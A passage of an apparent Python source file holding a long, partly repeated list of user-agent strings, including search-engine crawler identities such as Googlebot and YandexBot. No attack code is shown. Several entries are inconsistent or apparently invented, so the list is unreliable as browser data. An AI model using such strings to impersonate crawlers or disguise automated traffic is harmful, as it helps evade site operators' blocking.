               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
               'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
               'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
               'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3',
               'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
               'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
               'Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0',
               'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0',
               'Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0',
               'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0',
               'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
               'Mozilla/5.0(compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)',
               'Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)',
               'Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+',
               'Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+',
               'Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+',
               'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5',
               'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25',
               'Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10',
               'Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
               'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
               'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
               'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3',
               'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
               'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
               'Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0',
               'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0',
               'Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0',
               'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0',
               'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
               'Mozilla/5.0(compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)',
               'Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)',
               'Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+',
               'Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+',
               'Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+',
               'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5',
               'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25',
               'Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10',
               'Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
